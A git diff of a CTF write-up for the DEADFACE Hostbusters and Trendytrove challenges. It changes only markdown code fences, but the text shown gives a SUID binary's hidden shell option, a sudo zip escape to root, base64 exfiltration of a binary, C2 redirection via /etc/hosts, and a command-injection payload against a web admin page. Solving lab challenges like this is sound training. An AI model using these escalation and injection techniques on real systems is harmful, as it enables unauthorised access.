@@ -15,11 +15,12 @@ I also completed the Trendytrove track which apparently wasn't that easy to full
 ## Flag 1: Landing zone
 
 So the first step consisted of connecting to the remote machine with the provided credentials on the website:
-```Text
+
+```
 ro@Parrot:~/$ ssh deephax@deephax.deadface.io
 ```
 And the first flag could be found by cating the file in the current directory
-```Text
+```
 ~ $ ls
 flag1.txt  hint.txt
 ~ $ cat flag1.txt 
@@ -29,7 +30,7 @@ flag{hostbusters1_e361b9b8352eea50}~ $
 ## ~~Flag 2: Short-Term~~ Flag 3: Mind Your Surroundings
 
 The third flag was also pretty straightforward (it appeared to me before the second one), there was a hint note next to the flag which clearly let know tha we have to use the ``env`` command: 
-```Text
+```
 ~ $ cat hint.txt 
 The environment hides many secrets...
 ~ $ env 
@@ -54,7 +55,8 @@ Running this command also tells us a lot about the system and is something that 
 
 This flag requires to search a little bit across the system everywhere you can. Sometimes it is a hidden file (starting with a dot), it could also be explicit (named `flag`) or implicit. some interesting directories are the home of the users (your own but could also be the others if you are lucky enough to have the permissions), the directories `/var`, `/tmp`, `/usr`, etc. I found the flag my listing the `/tmp` directory (short-term says the flag, just like my memory). Also when entering in such challenges, do not hesitate to setup your own aliases such as I did, it saves you time and it's a set it and forget it thing.
 
-```Text
+
+```
 ~ $ alias "ls"="ls -la"
 ~ $ ls /tmp
 total 12
@@ -105,7 +107,8 @@ The message coming with the flag title was:
 
 So we had to figure out what this machine was doing, staring by using ``ps``.
 
-```Text 
+
+``` 
 ~ $ ps -a 
 PID   USER     TIME  COMMAND
     1 root      0:00 {start.sh} /bin/sh /usr/local/bin/start.sh
@@ -117,7 +120,8 @@ PID   USER     TIME  COMMAND
 ```
 Some stuff are weird here. the root user is running a cronjob, along with something called ``usrv`` and a script called `start.sh`. But there is nothing really explicit about what the server is doing. Before investigating on the cronjob I tried to see which port were open on the machine using ``netstat`` as a last try to see if we could figure out something else and it looks like it paid off.
 
-```Text
+
+```
 netstat: can't scan /proc - are you root?
 Active Internet connections (servers and established)
 Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
@@ -131,7 +135,7 @@ So not only we have a port open but also listening for all incoming connections 
 
 ![Desktop View](/assets/img/2024-10-20-Deadface-Hostbuster/plz_netcat.jpg)
 
-```Text
+```
 ~ $ nc -u 127.0.0.1 2342
 hello
 flag{hostbusters4_3dbd2ed4c572b7ea}Flag sent to client.
@@ -144,7 +148,7 @@ And boom another flag.
 Remember this cronjob wizardry ? Let's investigate this with in mind the fact that this challenge had the tag "privesc". I often make references to what is written on the challenges statements and it might be because of my academical background but trust me, when you do not know what to look for, the statement often set a crucial context and you can sometimes guess what you are expected to do. So let's root bad boy. 
 
 
-```Text
+```
 ~ $ cat /etc/crontabs/root 
 # do daily/weekly/monthly maintenance
 # min	hour	day	month	weekday	command
@@ -158,7 +162,8 @@ Remember this cronjob wizardry ? Let's investigate this with in mind the fact th
 ~ $
 ```
 So something is going on with a program called sendit called every time and the standard error is sent to the logs. Let's see what it this. 
-```Text
+
+```
 ~ $ /opt/sendit/sendit
 Error, no such host: c2.deadface.io
 ~ $ cat /var/log/sendit.log 
@@ -178,7 +183,7 @@ readlog/  sendit/
 The script seems to try to establish a connection with its C2. Most of the privesc on Linux are sudo misconfigurations or SUID on program you can abuse. By the way, I tried ``sudo -l`` and it asked for a password and failed.
 Here we can see that I discovered a folder called readlogs that is not supposed to be here next to ``sendit``. ``sendit`` belongs to root, I cated it and (not showing you the garbage) it is a binary. It doesn't seems to be made to take whatever input you give it but readlog ? This thing speaks for itself and is calling me to input some bad things into it:
 
-```Text
+```
 ~ $ ls /opt/readlog
 total 8
 drwxr-xr-x    1 root     root          4096 Sep 29 17:52 .
@@ -195,7 +200,8 @@ Usage: readlog [-f FILE] [-v]
 
 (Yeah it wasn't in the associated opt directory but I just assumed it was somewhere in the machine.)
 
-```Text
+
+```
 ~ $ ls /usr/bin/readlog 
 -rwsr-sr-x    1 lilith   lilith       19072 Sep 29 17:52 /usr/bin/readlog
 ~ $
@@ -204,14 +210,14 @@ Okay so giving us access to prives directly to the root user seems to be too eas
 
 This binary (I also cated it, not showing you, the `file` command wasn't installed) seems to be a custom tool because it has nothing to do with Linux legacy stuff. I messed around, tried to read files with it and it just worked. At some point I just exfiltrated the binary to reverse it. To exfiltrate a binary you can just input it to base64, copy paste the base64 on your machine and revert the process. 
 
-```Text
+```
 ~ $ base64 -w0 /usr/bin/readlog
 f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAEBEAAAAAAABAAAAAAAAAAIBBAAAAAAAAAAAAAEAAOAANAEAAJAAjAAYAAAAEAAAAQAAAAAAAAABAAAAAAAAAAEAAAAAAAAAA2AIAAAAAAADYAgAAAAAAAAgAAAAAAAAAAwAAAAQAAAAYAwAAAAAAABgDAAAAAA...
 ```
 
 Then on your local machine create a text file where you paste the base64 string and:
 
-```Text
+```
 RMI78@4tt4ck:~/Downloads/DEADFACE/Hostbuster$ base64 -d readlogs > readlogs2.exe
 ```
 
@@ -221,7 +227,7 @@ The binary has not for purpose to run on your machine, the goal is here to input
 
 You can see over the different tools and with the above image that there is a command called "execute_command_as_lilith" which smells really good, and in the main function, you can see by the getops function that you also have an hidden option "c" which could stand for "command" so let's try opening a bash with that.
 
-```Text
+```
 ~ $ readlog -c sh
 Executing command as lilith: sh
 ~ $ whoami
@@ -231,7 +237,7 @@ lilith
 
 Okay so my first reflex after that was to see if sudo can be abused.
 
-```Text
+```
 ~ $ sudo -l 
 User lilith may run the following commands on 330f0a5da9a4:
     (ALL) NOPASSWD: /usr/bin/zip
@@ -240,7 +246,7 @@ User lilith may run the following commands on 330f0a5da9a4:
 
 And now if you know the website [GTFOBins](https://gtfobins.github.io/), you know it is already a win to root. Look for the appropriate zip page, you barely have to understand the payload, just copy-past and you're in:
 
-```Text
+```
 ~ $ TF=$(mktemp -u)
 ~ $ sudo zip $TF /etc/hosts -T -TT 'sh #'
 sudo rm $TF  adding: etc/hosts (deflated 35%)
@@ -263,7 +269,7 @@ root
 
 Okay so when I saw the challenge name, I knew something was going on with the ``sendit`` program. I remember there was a .config.json when listing the directory of the program. 
 
-```Text
+```
 /home/deephax # cat /opt/sendit/.config.conf 
 {
   "host": "c2.deadface.io",
@@ -275,7 +281,7 @@ Okay so when I saw the challenge name, I knew something was going on with the ``
 
 At this point it is pretty obvious to see where this is going. As root you can either change the config file I opted for the second option to let everything untouched here: change the ``/etc/hosts`` file to redirect all traffic going to this domain, on localhost:
 
-```Text
+```
 /home/deephax # echo "127.0.0.1    c2.deadface.io" >> /etc/hosts 
 /home/deephax # nc -lp 1516
 flag{hostbusters5_7af321526c15006a}
@@ -298,7 +304,8 @@ Because it is on the username you log with a user ID of 1 which is the admin whi
 ## Flag 2: Yalonda
 
 Here we need to find Yalonda's birthday date, mean there should be a way to expose customer's data, so I messed around with the application, explored the profile page but nothing. Instead of fuzzing the website, I just, by pure coincidence, tried to see if there was an admin page by entering the following url:
-```Text
+
+```
 https://trendytrove.deadface.io/admin.php
 ```
 And it paid off:
@@ -315,7 +322,7 @@ So I started the development tool on my browser to see the request being sent to
 Oh boy, that is an RCE (Remote Code Execution) here, the "command" value is something executed on the server. From here some folks may start their best Burp Suite or whatever tool proxying browser to intercept and modify the request before it leaves. I personnaly stayed with my Firefox knowing you can replay requests from the dev tool interface, so I tried a couple of options to see what I can do as an (I assumed) "www-data" user. 
 
 I tried the following input as a command because having write permission on the folder would allow the injection of a PHP web shell:
-```Text
+```
 command="echo thisisatest > test.txt && ls -a"&check_status=
 ```
 And I was right about the RCE and writing access (text.txt cropped away from the image)
